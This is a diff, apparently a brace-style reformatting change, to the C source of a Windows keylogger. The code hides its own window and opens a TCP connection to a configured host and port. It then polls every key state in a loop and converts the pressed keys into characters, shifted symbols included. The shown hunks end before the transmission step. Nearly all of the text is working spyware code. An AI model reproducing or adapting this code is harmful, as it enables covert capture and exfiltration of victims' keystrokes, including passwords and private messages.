@@ -7,16 +7,14 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	
     DWORD pid;
     GetWindowThreadProcessId(hwnd, &pid);
-    if (pid == GetCurrentProcessId()) 
-        {
+    if (pid == GetCurrentProcessId()) {
             ShowWindow(hwnd, SW_HIDE);
             return FALSE;
         }
     return TRUE;
 }
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-    LPSTR lpCmdLine, int nCmdShow)
-{
+    LPSTR lpCmdLine, int nCmdShow) {
     WSADATA wsa;
     SOCKET s;
     INPUT Event;
@@ -28,14 +26,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     /*	
     	Connects to the server
     */
-    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
-    {   
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {   
         printf("Failed. Error Code : %d",WSAGetLastError());
         return 2;  
     }
     s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (s == INVALID_SOCKET)
-    {
+    if (s == INVALID_SOCKET) {
         printf("Failed. Error Code : %d",WSAGetLastError());
         WSACleanup();
         return 2;
@@ -44,8 +40,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     server.sin_addr.s_addr = inet_addr(HOST);
     server.sin_family = AF_INET;
     server.sin_port = htons(PORT);
-    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
-    {   
+    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {   
         printf("Failed. Error Code : %d", WSAGetLastError());
         WSACleanup(); 
         closesocket(s);
@@ -56,26 +51,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     */
     while (TRUE)
         for ( int i = 0x00 ; i<0xfe ; ++i )
-            if ( GetKeyState(i) < 0 )
-            {
+            if ( GetKeyState(i) < 0 ) {
                 Event.type = INPUT_KEYBOARD;
                 Event.ki.dwFlags = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;
                 Event.ki.wScan = MapVirtualKey(i, 0);
                 if ((i >= '0' && i <= '9') || 
-                    (i >= 'A' && i <= 'Z') || 
-                    (i >= VK_OEM_1 && i <= VK_OEM_8) || 
-                    i == VK_SPACE || i == VK_BACK ||
-                     i == VK_RETURN || i == VK_TAB)
-                {
+                (i >= 'A' && i <= 'Z') || 
+                (i >= VK_OEM_1 && i <= VK_OEM_8) || 
+                i == VK_SPACE || i == VK_BACK ||
+                i == VK_RETURN || i == VK_TAB) {
                     SendInput(1, &Event, sizeof(Event));
                     if ((i >= '0' && i <= '9') || (i >= 'A' && i <= 'Z')) chr = (char)i;                      
                     if ( i == VK_RETURN) chr = '\n';
                     if ( i == VK_BACK || i == VK_SPACE || i == VK_TAB ) chr = ' ';
                     else if ((i >= 'A' && i <= 'Z') && GetKeyState(VK_SHIFT) >= 0) chr = (char)(i+32);
-                    else if (GetKeyState(VK_SHIFT) < 0)
-                    {
-                        switch (i)
-                        {
+                    else if (GetKeyState(VK_SHIFT) < 0) {
+                        switch (i) {
                         	case '0' : chr = ')'; break;
 	                        case '1' : chr = '!'; break;
 	                        case '2' : chr = '@'; break;
@@ -101,8 +92,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                         
                     }
                     else
-	                    switch (i)
-	                    {
+	                    switch (i){
 	                    	case VK_OEM_1 : chr = ';'; break;
 		                    case VK_OEM_PLUS : chr = '='; break;
 		                    case VK_OEM_COMMA : chr = ','; break;
